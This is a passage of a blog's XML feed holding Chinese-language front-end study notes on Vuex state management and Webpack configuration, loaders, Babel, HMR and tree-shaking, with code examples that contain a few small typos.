class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">Loading</span><span class="hljs-literal">--</span>&gt;<span class="hljs-comment">FP</span><span class="hljs-literal">--</span>&gt;<span class="hljs-comment">LCP</span><br></code></pre></td></tr></table></figure><ul><li>加载耗时</li><li>取消率</li><li>重启率</li><li>卡死次数占比</li><li>LCP到达率</li><li>白屏率</li><li>…</li></ul><h5 id="优化手段"><a href="#优化手段" class="headerlink" title="优化手段"></a>优化手段</h5><p><img src="https://s3.bmp.ovh/imgs/2023/02/04/74198b1d11beee76.jpg"></p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Write</span> <span class="hljs-built_in">Once</span>、<span class="hljs-built_in">Run</span> <span class="hljs-variable">Anywhere</span>！<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>面试笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vuex</title>
    <link href="/2023/03/27/Vuex/"/>
    <url>/2023/03/27/Vuex/</url>
    
    <content type="html"><![CDATA[<h1 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h1><h2 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h2><h4 id="1-Vuex是什么？"><a href="#1-Vuex是什么？" class="headerlink" title="1.Vuex是什么？"></a>1.Vuex是什么？</h4><p>状态管理模式+库；采用集中式存储管理应用组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。</p><h4 id="2-状态管理模式"><a href="#2-状态管理模式" class="headerlink" title="2.状态管理模式"></a>2.状态管理模式</h4><p>举个栗子🌰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vue">const Counter = &#123;<br>  // 状态<br>  data () &#123;<br>    return &#123;<br>      count: 0<br>    &#125;<br>  &#125;,<br>  // 视图<br>  template: `<br>    &lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt;<br>  `,<br>  // 操作<br>  methods: &#123;<br>    increment () &#123;<br>      this.count++<br>    &#125;<br>  &#125;<br>&#125;<br><br>createApp(Counter).mount(&#x27;#app&#x27;)<br></code></pre></td></tr></table></figure><p>该APP包含以下部分：</p><ul><li>状态，驱动应用的数据源；</li><li>视图，以声明方式将状态映射到试图；</li><li>操作，响应在视图上的用户输入导致状态变化；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2022/10/29/d3e085834c6b02a0.png"></p><ul><li>存在一种多个视图依赖于同一种状态的情况；</li><li>不同视图变更统一状态的情况；</li></ul><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>把组件的共享状态抽取出来，以一个全局单例模式管理；</p><p>通过定义和隔离状态管理中的各种概念并通过强制规则维持视图和状态间的独立性，我们的代码将会变得更结构化且更易于维护；</p><p><img src="https://s3.bmp.ovh/imgs/2022/10/29/348dbed9d3ef8569.png"></p><h4 id="3-安装方法"><a href="#3-安装方法" class="headerlink" title="3.安装方法"></a>3.安装方法</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/path/to/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/path/to/vuex.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">npm install vuex@next --save<br></code></pre></td></tr></table></figure><h4 id="4-store基础"><a href="#4-store基础" class="headerlink" title="4. store基础"></a>4. store基础</h4><p>如果有一部分的状态需要在多个组件实例间共享，可以使用reactive()来创建一个响应式对象，并将它导入到多个组件中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//store.js</span><br><span class="hljs-keyword">import</span> &#123; reactive &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> store=<span class="hljs-title function_">reactive</span>(&#123;<br>    <span class="hljs-attr">count</span>:<span class="hljs-number">0</span><br>&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vue">//componentA<br>&lt;script&gt;<br>import &#123; store &#125; from &#x27;./store.js&#x27;<br>    <br>    export default &#123;<br>        data()&#123;<br>            return&#123;<br>                store,<br>            &#125;<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br><br>&lt;template&gt;<br>From A:&#123;&#123; store.count &#125;&#125;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vue">//componentB<br>&lt;script&gt;<br>import &#123; store &#125; from &#x27;./store.js&#x27;<br>    <br>    export default &#123;<br>        data()&#123;<br>            return&#123;<br>                store,<br>            &#125;<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br><br>&lt;template&gt;<br>From B:&#123;&#123; store.count &#125;&#125;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure><p>现在，所有引入了store的组件都可以改动count，但是从长远看这种代码是不容易维护的。</p><p>解决方法：在store上定义方法，方法的名字需要能表达意图；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//store.js</span><br><span class="hljs-keyword">import</span> &#123; reactive &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> store=<span class="hljs-title function_">reactive</span>(&#123;<br>    <span class="hljs-attr">count</span>:<span class="hljs-number">0</span>，<br>    <span class="hljs-title function_">increment</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++<br>&#125;,<br>&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;button @click=&quot;store.increment()&quot;&gt;<br>    From B: &#123;&#123; store.count &#125;&#125;<br>  &lt;/button&gt;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure><h4 id="4-SSR（Server-Side-Rendering）服务端渲染"><a href="#4-SSR（Server-Side-Rendering）服务端渲染" class="headerlink" title="4.SSR（Server-Side Rendering）服务端渲染"></a>4.SSR（Server-Side Rendering）服务端渲染</h4><blockquote><p>默认情况下，Vue 组件的职责是在浏览器中生成和操作 DOM。然而，Vue 也支持将组件在服务端直接渲染成 HTML 字符串，作为服务端响应返回给浏览器，最后在浏览器端将静态的 HTML“激活”(hydrate) 为能够交互的客户端应用。 </p></blockquote><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><ul><li>更快的首屏加载：服务端渲染的 HTML 无需等到所有的 JavaScript 都下载并执行完成之后才显示，所以你的用户将会更快地看到完整渲染的页面。数据获取过程在首次访问时在服务端完成，相比于从客户端获取，可能有更快的数据库连接。</li><li>统一的心智模型</li><li>更好的SEO：搜索引擎爬虫可以直接看到完全渲染的页面。</li></ul><h2 id="二、使用"><a href="#二、使用" class="headerlink" title="二、使用"></a>二、使用</h2><h3 id="1-最简单的store"><a href="#1-最简单的store" class="headerlink" title="1.最简单的store"></a>1.最简单的store</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; createApp &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> &#123; createStore &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vuex&#x27;</span><br><br><span class="hljs-comment">// 创建一个新的 store 实例</span><br><span class="hljs-keyword">const</span> store = <span class="hljs-title function_">createStore</span>(&#123;<br>  state () &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-attr">count</span>: <span class="hljs-number">0</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">mutations</span>: &#123;<br>    increment (state) &#123;<br>      state.<span class="hljs-property">count</span>++<br>    &#125;<br>  &#125;<br>&#125;)<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(&#123; <span class="hljs-comment">/* 根组件 */</span> &#125;)<br><br><span class="hljs-comment">// 将 store 实例作为插件安装</span><br>app.<span class="hljs-title function_">use</span>(store)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue笔记</title>
    <link href="/2022/11/12/Webpack%E4%BD%93%E7%B3%BB/"/>
    <url>/2022/11/12/Webpack%E4%BD%93%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="Webpack知识体系"><a href="#Webpack知识体系" class="headerlink" title="Webpack知识体系"></a>Webpack知识体系</h1><ul><li>理解前端工程话概念、工具、目标；</li><li>团队需要有人熟悉webpack；</li><li>高阶前端必经之路；</li></ul><h2 id="一、什么是webpack"><a href="#一、什么是webpack" class="headerlink" title="一、什么是webpack?"></a>一、什么是webpack?</h2><h3 id="1-前端项目构成"><a href="#1-前端项目构成" class="headerlink" title="1.前端项目构成"></a>1.前端项目构成</h3><ul><li>多媒体文件</li><li>CSS</li><li>JS</li><li>HTML</li><li>VUE</li></ul><h5 id="手动管理"><a href="#手动管理" class="headerlink" title="手动管理"></a>手动管理</h5><ul><li>比如引入50个js文件，操作过程繁琐；</li><li>当代码文件之间有依赖时，得严格依赖顺序书写；</li><li>开发与生产环境一致，很呐接入TS或JS新特性；</li><li>比较难接入Less、Sass等工具；</li><li>JS、图片、CSS资源管理模型不一致；</li></ul><h3 id="2-常见工程化工具"><a href="#2-常见工程化工具" class="headerlink" title="2.常见工程化工具"></a>2.常见工程化工具</h3><ul><li>Webpack</li><li>Vite</li><li>RollupJS</li></ul><h3 id="3-Webpack"><a href="#3-Webpack" class="headerlink" title="3. Webpack"></a>3. Webpack</h3><h5 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h5><ul><li>多份资源文件打包成Bundle；</li><li>支持Babel、Eslint、TS、CoffeeScript、Less、Sass；</li><li>支持模块化处理CSS、图片等资源文件；</li><li>支持HMR+开发服务器；</li><li>支持持续监听、持续构建；</li><li>支持代码分离；</li><li>支持Tree-shaking;</li><li>支持Sourcemap；</li></ul><h2 id="二、Webpack"><a href="#二、Webpack" class="headerlink" title="二、Webpack"></a>二、Webpack</h2><h3 id="1-示例"><a href="#1-示例" class="headerlink" title="1.示例"></a>1.示例</h3><h5 id="Setp1-安装webpack"><a href="#Setp1-安装webpack" class="headerlink" title="Setp1.安装webpack"></a>Setp1.安装webpack</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>npm i -D webpack webpack-cli<br></code></pre></td></tr></table></figure><h5 id="Setp2-编辑配置文件-webpack-config-js"><a href="#Setp2-编辑配置文件-webpack-config-js" class="headerlink" title="Setp2.编辑配置文件 webpack.config.js"></a>Setp2.编辑配置文件 webpack.config.js</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> path=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>=&#123;<br>    <span class="hljs-attr">entry</span>:<span class="hljs-string">&#x27;./src/index&#x27;</span>,<span class="hljs-comment">//定义当前项目的入口</span><br>    <span class="hljs-attr">mode</span>:<span class="hljs-string">&quot;development&quot;</span>,<br>    <span class="hljs-attr">devtool</span>:<span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">output</span>:&#123;<br>        <span class="hljs-attr">filename</span>:<span class="hljs-string">&#x27;[name].js&#x27;</span>,<span class="hljs-comment">//定义打包后文件的名称；</span><br>        <span class="hljs-attr">path</span>:path.<span class="hljs-title function_">join</span>(_dirname,<span class="hljs-string">&#x27;./dist&#x27;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Step3.执行编译命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npx webpack<br></code></pre></td></tr></table></figure><blockquote><p>打包到./dist/main.js</p></blockquote><h3 id="2-核心流程"><a href="#2-核心流程" class="headerlink" title="2.核心流程"></a>2.核心流程</h3><ul><li>入口处理：从entry文件开始，启动编译流程；</li><li>以来解析：从entry开始，根据‘require’ or ‘import’ 等语句找到依赖资源；</li><li>资源解析：更具‘module’配置，调用资源转移器，将png、css等非标准js资源转译为js内容；（如何实现？？）</li><li>资源合并打包：将转译后的资源内容合并打包为可直接在浏览器运行的js文件；</li></ul><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h3><ul><li>多文件资源合成一个，减少http请求；</li><li>支持模块化开发；</li><li>支持高级JS特性；</li><li>支持TS，CofferScript；</li><li>…</li></ul><h2 id="三、使用Webpack–流程类"><a href="#三、使用Webpack–流程类" class="headerlink" title="三、使用Webpack–流程类"></a>三、使用Webpack–流程类</h2><p><img src="https://s3.bmp.ovh/imgs/2023/02/08/3d52e90c95397aa0.jpg"></p><h3 id="1-配置文件"><a href="#1-配置文件" class="headerlink" title="1.配置文件"></a>1.配置文件</h3><p>Webpack的使用基本都围绕“配置”展开，而这些配置大致可以分为两类：</p><ul><li>流程类：作用于流程中的某个或多个环节，直接影响打包效果的配置项；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/08/175cc632cc5489e6.jpg"></p><ul><li>工具类：主流程之外，提供更多工程化能力的配置项；</li></ul><h3 id="2-必须配置"><a href="#2-必须配置" class="headerlink" title="2.必须配置"></a>2.必须配置</h3><blockquote><p>在一个项目配置里面，至少需要entry和output</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> path=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>=&#123;<br>    <span class="hljs-attr">entry</span>:<span class="hljs-string">&#x27;./src/index&#x27;</span>,<span class="hljs-comment">//定义当前项目的入口</span><br>    <span class="hljs-attr">output</span>:&#123;<br>        <span class="hljs-attr">filename</span>:<span class="hljs-string">&#x27;[name].js&#x27;</span>,<span class="hljs-comment">//定义打包后文件的名称；</span><br>        <span class="hljs-attr">path</span>:path.<span class="hljs-title function_">join</span>(_dirname,<span class="hljs-string">&#x27;./dist&#x27;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-处理CSS"><a href="#3-处理CSS" class="headerlink" title="3.处理CSS"></a>3.处理CSS</h3><ul><li>安装loader</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm add -D css-loader style-loader<br></code></pre></td></tr></table></figure><ul><li>添加module处理css文件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> path=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>=&#123;<br>    <span class="hljs-attr">entry</span>:<span class="hljs-string">&#x27;./src/index&#x27;</span>,<span class="hljs-comment">//定义当前项目的入口</span><br>    <span class="hljs-attr">output</span>:&#123;<br>        <span class="hljs-attr">filename</span>:<span class="hljs-string">&#x27;[name].js&#x27;</span>,<span class="hljs-comment">//定义打包后文件的名称；</span><br>        <span class="hljs-attr">path</span>:path.<span class="hljs-title function_">join</span>(_dirname,<span class="hljs-string">&#x27;./dist&#x27;</span>)<br>    &#125;，<br>    <span class="hljs-attr">module</span>:&#123;<br>    <span class="hljs-comment">//css处理器</span><br>    <span class="hljs-attr">rules</span>:[&#123;<br>            <span class="hljs-attr">test</span>:<span class="hljs-regexp">/\.css$/</span>,<span class="hljs-comment">//css文件名过滤条件，满足即处理</span><br>            <span class="hljs-attr">use</span>:[<span class="hljs-comment">//使用怎样的loader去处理</span><br>            <span class="hljs-string">&quot;style-loader&quot;</span>,<br>            <span class="hljs-string">&quot;css-loader&quot;</span><br>            ]<br>        &#125;]<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>引入</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> styles=<span class="hljs-title function_">requrie</span>(<span class="hljs-string">&quot;./index.css&quot;</span>);<br><br><span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./index.css&#x27;</span>;<br></code></pre></td></tr></table></figure><h5 id="loader有什么用？"><a href="#loader有什么用？" class="headerlink" title="loader有什么用？"></a>loader有什么用？</h5><h5 id="与旧时代html中维护css相比，使用loader有什么优劣？"><a href="#与旧时代html中维护css相比，使用loader有什么优劣？" class="headerlink" title="与旧时代html中维护css相比，使用loader有什么优劣？"></a>与旧时代html中维护css相比，使用loader有什么优劣？</h5><h5 id="如何在webpack接入Less，Sass，Stylus等？"><a href="#如何在webpack接入Less，Sass，Stylus等？" class="headerlink" title="如何在webpack接入Less，Sass，Stylus等？"></a>如何在webpack接入Less，Sass，Stylus等？</h5><h3 id="4-接入Babel"><a href="#4-接入Babel" class="headerlink" title="4.接入Babel"></a>4.接入Babel</h3><blockquote><p>将ES6代码转译为ES5，向下兼容；</p></blockquote><ul><li>安装依赖</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm i -D @babel/core @babel/preset-env babel-loader<br></code></pre></td></tr></table></figure><ul><li>声明产物出口<code>output</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> path=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>=&#123;<br>    <span class="hljs-attr">entry</span>:<span class="hljs-string">&#x27;./src/index&#x27;</span>,<span class="hljs-comment">//定义当前项目的入口</span><br>    <span class="hljs-attr">output</span>:&#123;<br>        <span class="hljs-attr">filename</span>:<span class="hljs-string">&#x27;[name].js&#x27;</span>,<span class="hljs-comment">//定义打包后文件的名称；</span><br>        <span class="hljs-attr">path</span>:path.<span class="hljs-title function_">join</span>(_dirname,<span class="hljs-string">&#x27;./dist&#x27;</span>)<br>    &#125;，<br>    <span class="hljs-attr">module</span>:&#123;<br>    <span class="hljs-comment">//css处理器</span><br>    <span class="hljs-attr">rules</span>:[&#123;<br>           <span class="hljs-attr">test</span>:<span class="hljs-regexp">/\/js$/</span>,<br>    <span class="hljs-attr">user</span>:[<br>    <span class="hljs-attr">loader</span>:<span class="hljs-string">&#x27;babel-loader&#x27;</span>,<br>    <span class="hljs-attr">options</span>:&#123;<br>    <span class="hljs-attr">presets</span>:[<br>    [<span class="hljs-string">&#x27;@babel/preset-env&#x27;</span>]<br>                                ]<br>                            &#125;<br>                     ]<br>            ]<br>        &#125;]<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>执行<code>npx webpack</code></li></ul><h5 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h5><ul><li>Babel具体由什么功能？</li><li>Babel与Webpack分别解决了什么问题？为何两者能协作到一块儿？</li></ul><h3 id="5-生成HTML"><a href="#5-生成HTML" class="headerlink" title="5.生成HTML"></a>5.生成HTML</h3><blockquote><p>自动生成HTML文件；</p></blockquote><ul><li>安装依赖</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm i -D html-webpack-plugin<br></code></pre></td></tr></table></figure><ul><li>声明产物出口<code>output</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> path=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>=&#123;<br>    <span class="hljs-attr">entry</span>:<span class="hljs-string">&#x27;./src/index&#x27;</span>,<span class="hljs-comment">//定义当前项目的入口</span><br>    <span class="hljs-attr">output</span>:&#123;<br>        <span class="hljs-attr">filename</span>:<span class="hljs-string">&#x27;[name].js&#x27;</span>,<span class="hljs-comment">//定义打包后文件的名称；</span><br>        <span class="hljs-attr">path</span>:path.<span class="hljs-title function_">join</span>(_dirname,<span class="hljs-string">&#x27;./dist&#x27;</span>)<br>    &#125;，<br>    <span class="hljs-attr">plugins</span>:[<span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>()]<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>执行<code>npx webpack</code></li></ul><h5 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h5><ul><li>相比于手工维护HTML内容，这张方式有什么优缺点？</li></ul><h2 id="四、使用web-pack–工具类"><a href="#四、使用web-pack–工具类" class="headerlink" title="四、使用web pack–工具类"></a>四、使用web pack–工具类</h2><h3 id="1-HMR-Hot-Module-Replacement"><a href="#1-HMR-Hot-Module-Replacement" class="headerlink" title="1. HMR Hot Module Replacement"></a>1. HMR Hot Module Replacement</h3><blockquote><p>模块热替换，写完的代码能立刻更新到页面；</p></blockquote><ul><li><p>开启HMR</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">devServer</span>:&#123;<br><span class="hljs-attr">hot</span>:<span class="hljs-literal">true</span>,<br><span class="hljs-attr">open</span>:<span class="hljs-literal">true</span><br>&#125;,<br><span class="hljs-attr">module</span>:&#123;<br>    <br>&#125;,<br><span class="hljs-attr">watch</span>:<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure></li><li><p>启动Webpack</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npx webpack serve<br></code></pre></td></tr></table></figure><h3 id="2-Tree-shaking"><a href="#2-Tree-shaking" class="headerlink" title="2.Tree-shaking"></a>2.Tree-shaking</h3><blockquote><p>删除没有使用到的代码</p></blockquote><ul><li>Dead Code：代码没有被用到，不可到达；代码的执行结果不会被用到；代码只读不写；</li><li>Tree-shaking：模块导出了但是没被使用；</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">mode</span>:<span class="hljs-string">&quot;production&quot;</span>,<br><span class="hljs-attr">optimization</span>:&#123;<br><span class="hljs-attr">usedExports</span>:<span class="hljs-literal">true</span>,<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="五、其他工具"><a href="#五、其他工具" class="headerlink" title="五、其他工具"></a>五、其他工具</h2><ul><li>缓存</li><li>Sourcemap</li><li>性能监控</li><li>日志</li><li>代码压缩</li><li>分包</li><li>…</li></ul><h2 id="六、理解Loader"><a href="#六、理解Loader" class="headerlink" title="六、理解Loader"></a>六、理解Loader</h2><h3 id="1-Webpack只认识JS"><a href="#1-Webpack只认识JS" class="headerlink" title="1.Webpack只认识JS"></a>1.Webpack只认识JS</h3><blockquote><p>为了处理非标准JS资源，设计出资源翻译模块—Loader</p><p>用于将资源翻译为标准JS</p></blockquote><h3 id="2-使用loader"><a href="#2-使用loader" class="headerlink" title="2.使用loader"></a>2.使用loader</h3><ul><li>安装依赖</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm add -D css-loader style-loader less-loader<br></code></pre></td></tr></table></figure><ul><li>添加<code>module</code>处理css文件</li></ul><h3 id="3-认识loader：链式调用"><a href="#3-认识loader：链式调用" class="headerlink" title="3.认识loader：链式调用"></a>3.认识loader：链式调用</h3><ul><li>less-loader：将less=&gt;css;</li><li>css-loader：将css包装成类似module.exports=”${css}”的内容，包装后的内容符合JS语法；</li><li>style-loader：将css模块包进require语句，并在运行时调用injectStyle等函数将内容注入到页面的style标签；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/08/d65b92e7cb18342c.jpg"></p><h3 id="4-loader特点"><a href="#4-loader特点" class="headerlink" title="4.loader特点"></a>4.loader特点</h3><ul><li>链式执行；</li><li>支持异步执行；</li><li>分normal、patch两种模式；</li></ul><h3 id="5-常见loader"><a href="#5-常见loader" class="headerlink" title="5.常见loader"></a>5.常见loader</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/08/fe2e05bc32513a45.jpg"></p><h5 id="问题-2"><a href="#问题-2" class="headerlink" 